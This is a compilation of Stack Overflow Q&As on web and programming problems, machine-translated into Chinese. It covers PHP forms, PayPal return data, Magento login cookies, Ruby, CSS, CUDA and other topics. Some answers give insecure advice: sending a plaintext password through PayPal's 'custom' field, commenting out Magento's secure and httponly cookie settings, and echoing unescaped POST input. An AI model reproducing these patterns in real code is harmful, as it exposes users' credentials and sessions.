        , TC_DONATE_COLD_ISCHEMIC = :TC_DONATE_COLD_ISCHEMIC
        , TC_DONATE_PERFUSION = :TC_DONATE_PERFUSION
        , DONOR_NAME = :DONOR_NAME
        , DONOR_NRIC = :DONOR_NRIC
        , DONOR_GENDER = :DONOR_GENDER
        , DONOR_AGE = :DONOR_AGE
        , DONOR_DEATH = :DONOR_DEATH
        , DONOR_INOTROPES = :DONOR_INOTROPES
        , DONOR_ISHYPER = :DONOR_ISHYPER
        , DONOR_HYPER = :DONOR_HYPER
        , DONOR_ISDIABETES = :DONOR_ISDIABETES
        , DONOR_DIABETES = :DONOR_DIABETES
        , DONOR_ISOTHERS = :DONOR_ISOTHERS
        , DONOR_OTHERS = :DONOR_OTHERS
        , DONOR_UREA = :DONOR_UREA
        , DONOR_CREAT = :DONOR_CREAT
        , DONOR_HB = :DONOR_HB
        , DONOR_PT = :DONOR_PT
        , DONOR_PTT = :DONOR_PTT
        , VIRO_HBSAG_RECP = :VIRO_HBSAG_RECP
        , VIRO_HBSAG_RECP_DATE = :VIRO_HBSAG_RECP_DATE
        , VIRO_ANTI_HB_RECP = :VIRO_ANTI_HB_RECP
        , VIRO_ANTI_HB_RECP_DATE = :VIRO_ANTI_HB_RECP_DATE
        , VIRO_ANTI_HBC_RECP = :VIRO_ANTI_HBC_RECP
        , VIRO_ANTI_HBC_RECP_DATE = :VIRO_ANTI_HBC_RECP_DATE
        , VIRO_HBV_RECP = :VIRO_HBV_RECP
        , VIRO_HBV_RECP_DATE = :VIRO_HBV_RECP_DATE
        , VIRO_ANTI_HCV_RECP = :VIRO_ANTI_HCV_RECP
        , VIRO_ANTI_HCV_RECP_DATE = :VIRO_ANTI_HCV_RECP_DATE
        , VIRO_HIV_AG_RECP = :VIRO_HIV_AG_RECP
        , VIRO_HIV_AG_RECP_DATE = :VIRO_HIV_AG_RECP_DATE
        , VIRO_HIV_PCR_RECP = :VIRO_HIV_PCR_RECP
        , VIRO_HIV_PCR_RECP_DATE = :VIRO_HIV_PCR_RECP_DATE
        , VIRO_CMV_RECP = :VIRO_CMV_RECP
        , VIRO_CMV_RECP_DATE = :VIRO_CMV_RECP_DATE
        , VIRO_VDRL_RECP = :VIRO_VDRL_RECP
        , VIRO_VDRL_RECP_DATE = :VIRO_VDRL_RECP_DATE
        , VIRO_ABO_RECP = :VIRO_ABO_RECP
        , VIRO_ABO_RECP_DATE = :VIRO_ABO_RECP_DATE
        , VIRO_HCV_PCR_RECP = :VIRO_HCV_PCR_RECP
        , VIRO_HCV_PCR_RECP_DATE = :VIRO_HCV_PCR_RECP_DATE
        , VIRO_HBSAG_DONOR = :VIRO_HBSAG_DONOR
        , VIRO_HBSAG_DONOR_DATE = :VIRO_HBSAG_DONOR_DATE
        , VIRO_ANTI_HB_DONOR = :VIRO_ANTI_HB_DONOR
        , VIRO_ANTI_HB_DONOR_DATE = :VIRO_ANTI_HB_DONOR_DATE
        , VIRO_ANTI_HBC_DONOR = :VIRO_ANTI_HBC_DONOR
        , VIRO_ANTI_HBC_DONOR_DATE = :VIRO_ANTI_HBC_DONOR_DATE
        , VIRO_HBV_DONOR = :VIRO_HBV_DONOR
        , VIRO_HBV_DONOR_DATE = :VIRO_HBV_DONOR_DATE
        , VIRO_ANTI_HCV_DONOR = :VIRO_ANTI_HCV_DONOR
        , VIRO_ANTI_HCV_DONOR_DATE = :VIRO_ANTI_HCV_DONOR_DATE
        , VIRO_HCV_PCR_DONOR = :VIRO_HCV_PCR_DONOR
        , VIRO_HCV_PCR_DONOR_DATE = :VIRO_HCV_PCR_DONOR_DATE
        , VIRO_HIV_AG_DONOR = :VIRO_HIV_AG_DONOR
        , VIRO_HIV_AG_DONOR_DATE = :VIRO_HIV_AG_DONOR_DATE
        , VIRO_HIV_PCR_DONOR = :VIRO_HIV_PCR_DONOR
        , VIRO_HIV_PCR_DONOR_DATE = :VIRO_HIV_PCR_DONOR_DATE
        , VIRO_CMV_DONOR = :VIRO_CMV_DONOR
        , VIRO_CMV_DONOR_DATE = :VIRO_CMV_DONOR_DATE
        , VIRO_VDRL_DONOR = :VIRO_VDRL_DONOR
        , VIRO_VDRL_DONOR_DATE = :VIRO_VDRL_DONOR_DATE
        , VIRO_ABO_DONOR = :VIRO_ABO_DONOR
        , VIRO_ABO_DONOR_DATE = :VIRO_ABO_DONOR_DATE
        , HLA_A1_RECP = :HLA_A1_RECP
        , HLA_A2_RECP = :HLA_A2_RECP
        , HLA_B1_RECP = :HLA_B1_RECP
        , HLA_B2_RECP = :HLA_B2_RECP
        , HLA_DR1_RECP = :HLA_DR1_RECP
        , HLA_DR2_RECP = :HLA_DR2_RECP
        , HLA_ANTITITRE_RECP = :HLA_ANTITITRE_RECP
        , HLA_A1_DONOR = :HLA_A1_DONOR
        , HLA_A2_DONOR = :HLA_A2_DONOR
        , HLA_B1_DONOR = :HLA_B1_DONOR
        , HLA_B2_DONOR = :HLA_B2_DONOR
        , HLA_DR1_DONOR = :HLA_DR1_DONOR
        , HLA_DR2_DONOR = :HLA_DR2_DONOR
        , HLA_ANTITITRE_DONOR = :HLA_ANTITITRE_DONOR
WHERE PAT_ID = :PAT_ID 
```

## Update

My problem is resolved, as I was not using the primary key to match the where condition, when I changed where condition with primary key it starts working.

Is it compulsory to give where condition with primary key while using sqldatasource (or with oracle) because generally we can put any where condition to update record while doing manually.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-08T07:03:13.570

是的，我认为如果您将 SqlDataSource 与 Oracle、SQL Server 或任何其他数据源一起使用，则必须使用主键才能使用 SqlDataSource 触发更新查询。

原因可能是 SqlDataSource 一次只允许编辑一条记录，因此更改将仅反映一条记录，而不会超过一条。

# ruby-on-rails - How declare a global variable in ROR3.0 within a function?

> ID：12328333
> 
> 赞同：0
> 
> 时间：2012-09-08T05:39:57.070
> 
> 标签：ruby-on-rails, ruby-on-rails-3

hi i m new to ruby on rails please let me know is it possible to declare a variable within the function/method

```
def fun1
  #initialized a global variable 
end  

def fun2
  #access value   
end 
```

is it possible get value of a variable declared in fun1 function by fun2 function

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T05:48:15.623

要创建真正的*全局*变量，请使用`$`：

```
def fun1
  $foo = 'bar'
end  

def fun2
  puts $foo
end 
```

一旦被调用，这里`$foo`就在类实例之外可用。`fun1`

如第一条评论所述，[应谨慎使用](http://www.rubyist.net/~slagell/ruby/globalvars.html)：

> 它们很危险，因为它们可以从任何地方写入。过度使用全局变量会使隔离错误变得困难；它也往往表明程序的设计没有经过仔细考虑。

您可能要求的是一个实例变量，它使用`@`：

```
def fun1
  @foo = 'bar'
end  

def fun2
  puts @foo
end 
```

这里`@foo`在类的当前实例中的任何地方都可用，再次通过调用声明它`fun1`。

例如，请参阅ruby​​ 中各种变量范围的[this](http://www.techotopia.com/index.php/Ruby_Variable_Scope)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:15:38.803

**首先，**如果您可以分享您需要从函数定义全局变量的实际场景，那就更好了。对于您的解决方案，可能有更好的、可管理的、干燥的方法。

**其次**，除了“Thilo”的回答之外，这里有一些参考资料显示了在不同情况下对**导轨的全局变量的使用。**不只是为了红宝石。你需要它来做铁轨吗？

*   [https://stackoverflow.com/a/4110947/1160106](https://stackoverflow.com/a/4110947/1160106)
*   [https://stackoverflow.com/a/3600860/1160106](https://stackoverflow.com/a/3600860/1160106)

# css - 我怎样才能给这个CSS一个内边框？

> ID：12328340
> 
> 赞同：3
> 
> 时间：2012-09-08T05:42:12.987
> 
> 标签：css, border

我试图给#page div一个与顶部周围的灰色边框一致的内边框：http: [//www.designated.net.au/testbed/testpage/](http://www.designated.net.au/testbed/testpage/)

我意识到我可以添加另一个 div，但这不是我正在寻找的解决方案，因为#page 中还会有其他内容。这可能吗？

这是从这个问题开始的：[Border-box CSS not working proper](https://stackoverflow.com/questions/12327920/border-box-css-not-working-properly)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T05:47:20.200

如果您不介意它在旧版浏览器中不起作用，您可以使用 .box-shadow。这可以在无需添加额外标记的情况下完成。您也可以使用 :before 或 :after 伪 css 类，但 box-shadow 更清洁 IMO。

```
-webkit-box-shadow(inset 0 0 1px #000);
   -moz-box-shadow(inset 0 0 1px #000);
     -o-box-shadow(inset 0 0 1px #000);
        box-shadow(inset 0 0 1px #000); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T05:52:30.540

您可以利用已经使用的相对定位将图像与边框对齐。

示例：http: [//jsfiddle.net/zbrcb/](http://jsfiddle.net/zbrcb/)

*将这些定义与您现有的定义合并。*

```
#page {
 border: 10px solid #333;  
}

#spotlight-main-top-left { z-index:3; position:relative; float:left; width:40px; height:40px; left: -10px; top: -10px; }
#spotlight-main-top-top { z-index:2; position:relative; width:100%; height:10px; background-color:#333333; top: -10px; }
#spotlight-main-top-right { z-index:3; position:relative; float:right; width:40px; height:40px; right: -10px; top: -10px; }
#spotlight-main-top-title { z-index:3; position:relative; margin:0 auto; width:200px; height:30px; top: -10px;  }
#spotlight-main-top-title-left { position:relative; float:left; width:30px; height:30px; }
#spotlight-main-top-title-right { position:relative; float:right; width:30px; height:30px; }
#spotlight-main-top-title-middle { position:relative; margin:0 30px 10px; width:140px; height:20px; background-color:#333333; }
#spotlight-main-top-title-text { position:relative; width:140px; height:18px; text-align:center; } 
```

在 Chrome、FF、Safari、IE 8/9 中工作（7 可能也可以工作；即使没有此更改，您的标题在 IE7 中也未对齐）。

就个人而言，我会尝试减少您用于创建网站顶部的元素数量，但公平地说，它工作正常。

# opengl-es - '无法为 Android 模拟器获取 wglGetExtensionsStringARB'

> ID：12328344
> 
> 赞同：12
> 
> 时间：2012-09-08T05:42:35.617
> 
> 标签：opengl-es, android-emulator, avd

实际上，我在 Eclipse 中的 Android 应用程序有问题。当我运行我的程序时，它会给我一条消息，其中包含许多错误。因此，我将它们复制并粘贴在这里，以向您展示模拟器的确切问题。有任何想法吗？

```
Starting emulator for AVD 
Failed to create Context 0x3005
could not get wglGetExtensionsStringARB
emulator: WARNING: Could not initialize OpenglES emulation, using software renderer.
could not get wglGetExtensionsStringARB
could not get wglGetExtensionsStringARB
could not get wglGetExtensionsStringARB
could not get wglGetExtensionsStringARB
could not get wglGetExtensionsStringARB
could not get wglGetExtensionsStringARB
could not get wglGetExtensionsStringARB 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-23T09:04:23.697

尝试将 RAM 设置为 512 Mb。它对我有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-01-23T14:21:14.053

尝试更新您的显卡驱动程序

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-10-15T08:48:34.087

回答这个问题可能为时已晚，但我`could not get wglGetExtensionsStringARB`通过安装最新版本的图形（视频）驱动程序解决了这个问题（ ）。同样从设备属性中，我检查了“ `use host GPU`”选项。它现在正在使用以下设置：
![虚拟设备的设置](../Images/99ec2f3aec8c979b0e2168ab36034d47.png)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-29T05:01:34.630

模拟器的图形加速利用您的开发计算机的图形硬件，特别是它的图形处理单元 (GPU)，使屏幕绘制速度更快。要使用图形加速功能，您必须安装以下版本的 Android 开发工具：

```
Android SDK Tools, Revision 17 or higher
Android SDK Platform API 15, Revision 3 or higher 
```

请检查此链接[http://developer.android.com/tools/devices/emulator.html#acceleration](http://developer.android.com/tools/devices/emulator.html#acceleration)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-06-13T18:20:22.490

这有点边缘情况，但是当我在运行它的计算机上时，我的模拟器启动良好，*但是*当我远程进入该计算机（通过 RDP）并尝试启动模拟器时，它因这些错误而失败。

我相信这是模拟器软件通过远程连接的限制，因为我去了计算机的物理位置并启动了模拟器，它运行良好。

# asp.net - 仅使用 ASP.NET MVC 为经过身份验证的用户提供静态单页应用程序（静态 html）

> ID：12328348
> 
> 赞同：3
> 
> 时间：2012-09-08T05:44:12.387
> 
> 标签：asp.net, asp.net-mvc, iis, iis-7

我正在制作一个 ASP.NET MVC 站点，它需要为许多单页应用程序提供服务。

单页应用程序是静态 html、css 和 javascript 文件，一个包含 index.html 文件的文件夹和许多用于 css、图像和 javascript 的文件夹。

我从 IIS 服务器的虚拟目录中提供单页应用程序没有问题，但我想仅将它们提供给 ASP.NET MVC 解决方案中经过身份验证的用户，因此我现在正在尝试提供 index.html 文件从控制器方法。

当我通过加载和提供 index.html 文件来执行此操作时，我无法弄清楚如何为 index.html 文件使用的所有 css 和 javascript 文件提供服务，因为它们被 index.html 以相对路径引用，例如“css /style.css”和“js/somejavascript.js”。

我正在使用相关部分来简化独立于 ASP.NET MVC 解决方案的单页应用程序的开发和调试。

所以我的问题基本上是，我如何才能将具有相对 url 到 css 和 js 文件的静态 HTML 文件仅提供给 ASP.NET MVC 站点中经过身份验证的用户？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T05:54:21.087

如果我理解：您有一些不能/不想更改的静态 HTML 文件，带有相对 URL 链接。在这种情况下，只需构建您的 MVC 路由，以便相对路径起作用。例如，假设相对路径是这样的：

```
js/script.js
css/style.css 
```

当您将其发送回浏览器时，它将解析相对于当前路径的这些路径。因此，如果您从路由（例如）提供 HTML 文件：

*   [http://domain.com/myapp/home](http://domain.com/myapp/home)

然后浏览器会将请求发送到：

*   [http://domain.com/myapp/home/js/script.js](http://domain.com/myapp/home/js/script.js)
*   [http://domain.com/myapp/home/css/style.css](http://domain.com/myapp/home/css/style.css)

所以相应地调整路线，并确保任何备用路线重定向到主要路线，例如`/home/index`应该重定向到`/home`.

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-09-08T05:47:04.003

放置一个

```
[Authorize] 
```

用于服务“index.html”的控制器或操作的属性。

默认情况下，脚本和 css 是公开的，因此不需要授权。

# jquery - 带有项目符号的 jQuery 内容滑块

> ID：12328351
> 
> 赞同：0
> 
> 时间：2012-09-08T05:44:34.503
> 
> 标签：jquery, jquery-ui-slider

我正在尝试构建一个带有项目符号的基本 jQuery 自动内容滑块，您可以单击它转到相应的幻灯片。我已经建立了滑块，但不确定如何实施子弹。

HTML

```
<section>
        <div id="slideShow">

            <div class="slide">
                <div class="specialTitle">
                    <h6 class="red">DRIVE TOWN</h6>
                    <h6 class="green">E&ndash;&#36;DEAL SPECIAL ONLY</h6>
                </div>
                <div class="homeSpecial">
                    <h3>DRIVETOWN OFFER COMPREHENSIVE IN HOUSE FINANCE SERVICES</h3>
                    <a href="#" class="red">View full details</a>
                </div>
            </div>

            <div class="slide">
                <div class="specialTitle">
                    <h6 class="red">DRIVE TOWN</h6>
                    <h6 class="green">IN HOUSE FINANCE</h6>
                </div>
                <div class="homeSpecial">
                    <h3>YOUR FIRST WOF FREE WITH ANY VEHICLE PURCHASED AT DRIVE TOWN IN SEPTEMBER</h3>
                    <a href="#" class="red">View full details</a>
                </div>
            </div>

            <div class="slide">
                <div class="specialTitle">
                    <h6 class="red">DRIVE TOWN</h6>
                    <h6 class="green">FREE LOAN CAR</h6>
                </div>
                <div class="homeSpecial">
                    <h3>STAY ON THE ROAD WITH DRIVETOWNS FREE LOAN CAR</h3>
                    <a href="#" class="red">View full details</a>
                </div>
            </div>

        </div>
    </section> 
```

CSS

```
#slideShow{
height:180px;
width:630px;
position:relative;
margin:200px 0 0;
background-color:red;
}

#slideShow .slide{
position:absolute;
display:none;
background-color:pink;
}

#slideShow .active{
display:block;
}

#slideShow .specialTitle{
float:left;
width:195px;
height:40px;
margin:0;
padding:10px 0 0 25px;
background-color:rgba(0,0,0,0.8);
} 
```

查询

```
jQuery(document).ready(function () {
$("#slideShow .slide:first").addClass("active");
setInterval("slideShow()", 6000);
});
function slideShow() {
var $active = $("#slideShow .active");
var $next = ($("#slideShow .active").next().length > 0) ? $("#slideShow .active").next() : $("#slideShow div:first");
$next.fadeIn(1500,function(){
$next.addClass("active");
$active.fadeOut(1500).removeClass("active");
});
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T05:56:39.473

请将此插入到您的 CSS 代码中。

```
.orbit-bullets {
 left: 200px;
 top: -16px;
 } 
```

//jQuery

```
 jQuery('#featured').orbit({
 advanceSpeed: 6000,
  bullets: true,
 directionalNav: false
}); 
```

尝试这个

# php - 在表单提交上调用特定的 PHP 函数

> ID：12328354
> 
> 赞同：43
> 
> 时间：2012-09-08T05:45:30.317
> 
> 标签：php, isset

我试图在提交表单时调用特定的 php 函数，表单和 php 脚本都在同一页面中。我的代码在下面。（它不工作，所以我需要帮助）

```
<html>
    <body>
    <form method="post" action="display()">
        <input type="text" name="studentname">
        <input type="submit" value="click">
    </form>
    <?php
        function display()
        {
            echo "hello".$_POST["studentname"];
        }
    ?>
    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：76
> 
> 时间：2012-09-08T05:49:59.260

在下一行

```
<form method="post" action="display()"> 
```

动作应该是你的脚本的名字，你应该调用这个函数，像这样

```
<form method="post" action="yourFileName.php">
    <input type="text" name="studentname">
    <input type="submit" value="click" name="submit"> <!-- assign a name for the button -->
</form>

<?php
function display()
{
    echo "hello ".$_POST["studentname"];
}
if(isset($_POST['submit']))
{
   display();
} 
?> 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-09-08T05:54:00.803

你不需要这个代码

```
<?php
function display()
{
echo "hello".$_POST["studentname"];
}
?> 
```

相反，您可以通过使用 . 检查 post 变量来检查表单是否已提交`isset`。

这是代码

```
if(isset($_POST)){
echo "hello ".$_POST['studentname'];
} 
```

点击这里查看[isset的php手册](http://php.net/manual/en/function.isset.php)

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-09-08T05:56:29.890

假设你的脚本名为 x.php，试试这个

```
<?php 
   function display($s) {
      echo $s;
   }
?>
<html>
    <body>
        <form method="post" action="x.php">
            <input type="text" name="studentname">
            <input type="submit" value="click">
        </form>
        <?php
           if($_SERVER['REQUEST_METHOD']=='POST')
           {
               display();
           } 
        ?>
    </body>
</html> 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-08T05:47:34.987

PHP 在服务器上运行，您的浏览器是客户端。一旦服务器将所有信息发送给客户端，在发出另一个请求之前，服务器上什么也做不了。

要在不刷新页面的情况下发出另一个请求，您将不得不查看 ajax。查看 jQuery，因为它使 ajax 请求变得容易

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-08T05:49:15.913

如果你想在点击提交按钮时调用一个函数，那么你必须
使用 ajax 或 jquery，如果你想在提交表单后调用你的 php 函数，你可以这样做：

```
<html>
<body>
<form method="post" action="display()">
<input type="text" name="studentname">
<input type="submit" value="click">
</form>
<?php
function display()
{
echo "hello".$_POST["studentname"];
}
if($_SERVER['REQUEST_METHOD']=='POST')
{
       display();
} 
?>
</body>
</html> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-03-11T09:54:42.483

写下这段代码

```
<?php
    if(isset($_POST['submit'])){
        echo 'Hello World';
    } 
?>

<html>
     <body>
         <form method="post">
             <input type="text" name="studentname">
             <input type="submit" name="submit" value="click">
         </form>
     </body>
</html> 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-12-05T13:48:15.390

另一种选择，也许是一个不太好的程序编码，是将“函数名”发送到一个脚本，然后执行该函数。例如，对于登录表单，通常有登录、忘记用户名、忘记密码、登录活动，这些活动在表单上显示为按钮或锚点。所有这些都可以指向/作为，比如说，

```
weblogin.php?function=login
weblogin.php?function=forgotusername
weblogin.php?function=forgotpassword
weblogin.php?function=signin 
```

然后接收页面上的 switch 语句会做任何准备工作，然后调度或运行（下一个）指定的函数。

# cuda - 从数组中并行删除元素

> ID：12328357
> 
> 赞同：1
> 
> 时间：2012-09-08T05:45:35.933
> 
> 标签：cuda

我正在尝试做[STL remove_if](http://www.cplusplus.com/reference/algorithm/remove_if/)的并行版本。我所做的是在全局内存中创建一个计数器，并让每个线程在一个元素上工作。如果该元素不等于键，那么它将被复制到结果数组中，索引由计数器通过原子添加确定。有没有更好的选择来避免频繁的原子操作？

我发现thrust库也有remove_if，但是我对位于“thrust\detail\backend\cpp\remove.h”目录下的源代码感到很困惑：

```
template<typename ForwardIterator,
     typename InputIterator,
     typename Predicate>
ForwardIterator remove_if(ForwardIterator first,
                        ForwardIterator last,
                        InputIterator stencil,
                        Predicate pred)
{
// advance iterators until pred(*stencil) is true or we reach the end of input
while(first != last && !bool(pred(*stencil)))
{
    ++first;
    ++stencil;
}

if(first == last)
    return first;

// result always trails first 
ForwardIterator result = first;

++first;
++stencil;

while(first != last)
{
    if(!bool(pred(*stencil)))
    {
        *result = *first;
        ++result;
    }
    ++first;
    ++stencil;
}

return result;
} 
```

这不是按顺序执行元素删除吗？

感谢您的任何建议！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T20:40:28.497

除非您有令人信服的理由推出自己的实现，否则我建议您只使用 Thrust remove_if()。Thrust 以 STL 为模型，如果您对通用性的要求相似，您最终会编写看起来与 Thrust 源代码非常相似的代码。

如果 Thrust 的性能不令人满意，Thrust 社区（包括主要作者）可能会对如何制定代码以获得更好的性能提出很好的建议。

如果做不到这一点 - 如果你有一个垂直应用程序并且 Thrust 不够快 - 作为最后的手段滚动基于扫描的实现。该算法的一行总结是对谓词的逆进行并行前缀求和（“扫描”）——然后由扫描的相应元素指定要保留的元素的输出索引。

# ruby - Ruby 字符串与表达式不匹配

> ID：12328362
> 
> 赞同：0
> 
> 时间：2012-09-08T05:46:12.850
> 
> 标签：ruby

我有这个红宝石表达式如下

```
 (a|bc)(d?|e)* 
```

当我使用 rubular 测试可能适合此表达式的字符串时，我有一些字符串我不明白为什么它们不适合

字符串是“ade”，它匹配“ad”但不匹配“e”。任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:04:17.820

您输入的正则表达式 (d?|e)* 的第二部分是问题所在。放? 在 d 上说，匹配 d 0 或 1 次。当您遍历字符串 ade 时，正则表达式匹配 a，然后是 d，然后是 d 0 次...如果您改为将其更改为 (a|bc)(d|e)*，它将匹配 ade，并且似乎有您正在寻找的语义。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T06:17:06.577

(d?)* 是非贪婪匹配，并且 e* 将被逻辑或“短路”。它将尽可能少地匹配。

我不知道你为什么在那儿打个问号。只需使用

```
(a|bc)(d|e)* 
```

会没事的。

# php - 从 PayPal 返回自定义输入数据

> ID：12328364
> 
> 赞同：5
> 
> 时间：2012-09-08T05:46:33.583
> 
> 标签：php, variables, return, paypal

我创建了一个基本的购买脚本，用户输入他们想要的用户名和密码，然后他们可以在我的网站上购买会员资格。但是，当它进入返回页面时，用户名和密码值不会显示在 url 中。这是代码：

```
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
    <input type="hidden" name="cmd" value="_s-xclick">
    <input type="hidden" name="hosted_button_id" value="CKQH4CYEMYLWW">
    <center>
        <span id="msgbox" style="display:none;"></span>
        <br><br>

        <input type="text" id="rusername" name="rusername" placeholder="Desired Username" class="usernamelogin">
        <br><br>

        <input type="password" id="rpassword" name="rpassword" placeholder="Desired Password" class="passwordlogin">
        <br><br>

        <input type="image" src="https://www.paypalobjects.com/en_US/GB/i/btn/btn_buynowCC_LG.gif" border="0" name="submit" alt="PayPal — The safer, easier way to pay online.">
        <img alt="" border="0" src="https://www.paypalobjects.com/en_GB/i/scr/pixel.gif" width="1" height="1">
</form> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:03:13.370

`cookie`为每个变量设置`input`变量并相应地传递数据。. 从*贝宝*返回时，您可以简单地检查`cookie`变量并相应地传递个人`input`数据..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:56:57.020

Paypal Standard 为传递自定义数据提供了一个变量“自定义”

因此您可以使用此变量传递这些值并返回。

例如。您可以使用 | 分隔值 然后回来

```
<input type="hidden" id="custom" name="custom" value="username|password"/> 
```

您可以在要提交表单时设置值

当成功页面出现时，您可以获得值

```
list($username,$password) = explode('|',$_POST['custom']); 
```

# php - 为什么我无法使用谷歌浏览器登录到 magento 后端

> ID：12328366
> 
> 赞同：14
> 
> 时间：2012-09-08T05:46:52.407
> 
> 标签：php, magento, google-chrome, login, magento-1.7

我正在使用 magento 社区版 1.7.0.2。我无法登录到 magento 的后端。我知道这个问题可能是因为 chrome 不接受 cookie。但是如何解决这个问题请帮忙。谢谢

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2013-01-28T09:50:19.477

如果您**为 Magento 管理面板启用了 https，请**确保将**System->configuration->web->Session and Cookie Management 下**的“Use HTTP Only”选项设置为“ **NO** ” 。”

 **如果您有权访问数据库，则打开表“ **core_config_data** ”并搜索路径“ **web/cookie/cookie_httponly** ”并将值设置为“0”。

确保删除 var/cache 文件夹。现在尝试登录 Magento 管理面板。大多数情况下你现在可以。如果不在此线程中发布您的问题。

所以这个“无法登录 Magento 管理面板”问题**主要与 Magento cookie 设置有关**。因此，如果您遇到这个小问题，请不要担心。使用此线程中的答案列表，您可以在几分钟内轻松解决此问题。

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2012-09-08T06:15:04.953

有两种解决方案，任何一种都可以：

*   更改 cookie 生命周期配置。转到后端 -> 系统 -> 配置 -> Web -> 会话和 Cookie 管理 将 cookie 生命周期设置为 86400 并保存。

![看这里](../Images/3521c67b327b25043a8ebc4b6c549d30.png)

*   转到您的 magento 目录中的 app/code/core/Mage/Core/Model/Session/Abstract/Varien.php 文件。

找到代码：

```
session_set_cookie_params(
$this->getCookie()->getLifetime(),
$this->getCookie()->getPath(),
$this->getCookie()->getDomain(),
$this->getCookie()->isSecure(),
$this->getCookie()->getHttponly()
); 
```

**或者**

```
// session cookie params
$cookieParams = array(
    'lifetime' => $cookie->getLifetime(),
    'path'     => $cookie->getPath(),
    'domain'   => $cookie->getConfigDomain(),
    'secure'   => $cookie->isSecure(),
    'httponly' => $cookie->getHttponly()
); 
```

并替换为

```
session_set_cookie_params(
$this->getCookie()->getLifetime(),
$this->getCookie()->getPath()
//$this->getCookie()->getDomain(),
//$this->getCookie()->isSecure(),
//$this->getCookie()->getHttponly()
); 
```

**或者**

```
// session cookie params
$cookieParams = array(
    'lifetime' => $cookie->getLifetime(),
    'path'     => $cookie->getPath()
//  'domain'   => $cookie->getConfigDomain(),
//  'secure'   => $cookie->isSecure(),
//  'httponly' => $cookie->getHttponly()
); 
```

在此之后保存文件。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-07-03T03:04:07.387

到目前为止，这是最好的解决方案，而不是在其他地方更改代码[http://iamtheshadowonthesun.blogspot.com/2012/10/magento-cannot-login-to-admin-panel.html](http://iamtheshadowonthesun.blogspot.com/2012/10/magento-cannot-login-to-admin-panel.html)

使用 phpMyAdmin，在您的 magento 数据库中，查找 core_config_data 表并单击它。单击“搜索”选项卡。然后在“路径”列上将运算符设置为 LIKE %...% 并将值设置为 cookie，然后单击“开始”按钮进行搜索。

搜索后，将web/cookie/cookie_path、web/cookie/cookie_domain、web/cookie/cookie_httponly、web/browser_capabilities/cookies的值设置为NULL

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-11-01T03:31:22.297

对我有用的是 Haijerome，不幸的是我无法登录后端来更改配置。这是我在安装新的新 magento 时执行的操作：

```
insert into core_config_data(scope, scope_id, path, value) values("default", "0", "web/cookie/cookie_httponly", "0"); 
```

然后：

```
rm -Rf var/cache/mage--* 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-01-09T08:24:08.903

一种简单的解决方案是使用 Opera 浏览器进行安装并使用它来登录，因为它会保存 cookie 本身。有用！

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-11-27T00:14:48.627

我们的 Chrome 用户无法将商品添加到他们的购物车......将 Cookie Lifetime 更改为推荐的 86400 修复了它。

Magento 社区 1.7

谢谢！

杰夫

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2012-12-19T22:37:12.703

问题是 chrome 没有存储登录 cookie，这可以通过查看 chrome | 中的 cookie 看出 设置 | 内容 | 高级 | 所有 cookie 和网站数据

发生这种情况的原因可能有很多，cookie 的生命周期肯定是其中之一。

我个人在 localhost / 在虚拟机上运行 magento 并从同一台机器上的浏览器连接时遇到了这个问题。具体问题似乎是，如果域名不合格，chrome 将不会存储 cookie。因此，如果您的域名是“http://localhost/magento”或“http://somename/magento”，chrome 将不会存储 cookie，因此您将无法登录

这是修复：

为了简单起见，我坚持使用 magento 在 localhost 上运行的示例。如果 magento 在 vm 上运行并且您正在从 localhost 访问，则相同的技巧将起作用，但在这种情况下，您需要修改来宾操作系统和客户端上的主机文件。（请记住，访客 ip 可能会不时更改，因此您需要不时更新主机上的 hosts 文件）

首先选择您的域名。它只是在本地，所以你不需要注册。我正在选择“dansmagentodev.com”。然后在magento | 系统 | web 将安全和不安全的 baseurl 修改为 [http://dansmagentodev.com/magento/](http://dansmagentodev.com/magento/)

接下来，在同一个地方，修改会话cookie管理“cookie域”为“dansmagentodev.com”

接下来我们需要配置您的系统以知道 dansmagentodev.com 确实是 localhost。我们通过主机文件来做到这一点。在 Windows 上，此文件位于 C:\Windows\System32\drivers\etc\hosts 中。您的病毒检查器可能会尝试阻止您对其进行修改（有充分的理由，在您进行修改时禁用病毒检查器）。然后添加行 127.0.0.1 dansmagentodev.com

现在从 chrome 登录。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2013-03-03T01:28:18.137

我的问题是，我运行的服务器是全新安装的 Ubuntu，几乎没有服务器维护配置。

它没有更新它的日期和时间，它落后了 3 小时。

这使得 Chrome 接收到的 cookie 看起来好像已经过期，因此 Chrome 将其丢弃。

* * *

## 回答 #9

> 赞同：0
